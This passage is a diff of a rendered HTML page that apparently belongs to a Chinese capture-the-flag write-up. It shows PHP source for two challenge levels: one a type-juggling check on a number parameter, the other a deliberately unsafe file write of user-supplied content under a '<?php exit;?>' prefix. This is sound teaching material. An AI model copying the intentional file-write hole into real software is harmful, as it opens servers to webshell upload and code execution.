-</span><span id="__span-36-33"><a id="__codelineno-36-33" name="__codelineno-36-33" href="#__codelineno-36-33"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-36-34"><a id="__codelineno-36-34" name="__codelineno-36-34" href="#__codelineno-36-34"></a><span class="p">}</span>
-</span><span id="__span-36-35"><a id="__codelineno-36-35" name="__codelineno-36-35" href="#__codelineno-36-35"></a>
-</span><span id="__span-36-36"><a id="__codelineno-36-36" name="__codelineno-36-36" href="#__codelineno-36-36"></a><span class="k">echo</span> <span class="s2">"&lt;p&gt;好像还差一点。&lt;/p&gt;"</span><span class="p">;</span>
-</span><span id="__span-36-37"><a id="__codelineno-36-37" name="__codelineno-36-37" href="#__codelineno-36-37"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">ob_start</span><span class="p">();</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nb">session_start</span><span class="p">();</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>    <span class="k">exit</span><span class="p">;</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="p">}</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'num'</span><span class="p">];</span>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie 不喜欢数组。"</span><span class="p">);</span>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="p">}</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">==</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"这都无法做到吗!"</span><span class="p">);</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="p">}</span>
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[a-z\.]/i"</span><span class="p">,</span> <span class="nv">$num</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xiexie感觉你应该没办法了!!"</span><span class="p">);</span>
+</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="p">}</span>
+</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>
+</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"玉米说以防万一再试试这个!!!"</span><span class="p">);</span>
+</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a><span class="p">}</span>
+</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
+</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="k">if</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="mi">411413</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: death.php"</span><span class="p">);</span>
+</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>    <span class="k">exit</span><span class="p">;</span>
+</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="p">}</span>
+</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>
+</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a><span class="k">echo</span> <span class="s2">"&lt;p&gt;好像还差一点。&lt;/p&gt;"</span><span class="p">;</span>
+</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
 <summary>第二关源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="nb">session_start</span><span class="p">();</span>
-</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
-</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
-</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"not found"</span><span class="p">);</span>
-</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="p">}</span>
-</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>
-</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>
-</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="p">}</span>
-</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>
-</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
-</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
-</span><span id="__span-37-17"><a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a>
-</span><span id="__span-37-18"><a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-37-19"><a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"说了xiexie不喜欢数组。"</span><span class="p">);</span>
-</span><span id="__span-37-20"><a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a><span class="p">}</span>
-</span><span id="__span-37-21"><a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a>
-</span><span id="__span-37-22"><a id="__codelineno-37-22" name="__codelineno-37-22" href="#__codelineno-37-22"></a><span class="c1">// hint：普通相对路径会写入站点根目录 /var/www/html/。</span>
-</span><span id="__span-37-23"><a id="__codelineno-37-23" name="__codelineno-37-23" href="#__codelineno-37-23"></a><span class="nv">$written</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span>
-</span><span id="__span-37-24"><a id="__codelineno-37-24" name="__codelineno-37-24" href="#__codelineno-37-24"></a>    <span class="nv">$filename</span><span class="p">,</span>
-</span><span id="__span-37-25"><a id="__codelineno-37-25" name="__codelineno-37-25" href="#__codelineno-37-25"></a>    <span class="s2">"&lt;?php exit;?&gt;"</span> <span class="o">.</span> <span class="nv">$content</span>
-</span><span id="__span-37-26"><a id="__codelineno-37-26" name="__codelineno-37-26" href="#__codelineno-37-26"></a><span class="p">);</span>
-</span><span id="__span-37-27"><a id="__codelineno-37-27" name="__codelineno-37-27" href="#__codelineno-37-27"></a>
-</span><span id="__span-37-28"><a id="__codelineno-37-28" name="__codelineno-37-28" href="#__codelineno-37-28"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$written</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-37-29"><a id="__codelineno-37-29" name="__codelineno-37-29" href="#__codelineno-37-29"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"写入失败。"</span><span class="p">);</span>
-</span><span id="__span-37-30"><a id="__codelineno-37-30" name="__codelineno-37-30" href="#__codelineno-37-30"></a><span class="p">}</span>
-</span><span id="__span-37-31"><a id="__codelineno-37-31" name="__codelineno-37-31" href="#__codelineno-37-31"></a>
-</span><span id="__span-37-32"><a id="__codelineno-37-32" name="__codelineno-37-32" href="#__codelineno-37-32"></a><span class="k">echo</span> <span class="s2">"xiexie吞了吞口水，他好像知道自己失败了"</span><span class="p">;</span>
-</span><span id="__span-37-33"><a id="__codelineno-37-33" name="__codelineno-37-33" href="#__codelineno-37-33"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">session_start</span><span class="p">();</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'ezphp_level1'</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"not found"</span><span class="p">);</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="p">}</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>    <span class="k">exit</span><span class="p">;</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="p">}</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"说了xiexie不喜欢数组。"</span><span class="p">);</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="p">}</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="c1">// hint：普通相对路径会写入站点根目录 /var/www/html/。</span>
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="nv">$written</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span>
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>    <span class="nv">$filename</span><span class="p">,</span>
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>    <span class="s2">"&lt;?php exit;?&gt;"</span> <span class="o">.</span> <span class="nv">$content</span>
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="p">);</span>
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>
+</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$written</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>    <span class="k">exit</span><span class="p">(</span><span class="s2">"写入失败。"</span><span class="p">);</span>
+</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="p">}</span>
+</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>
+</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="k">echo</span> <span class="s2">"xiexie吞了吞口水，他好像知道自己失败了"</span><span class="p">;</span>
+</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
     
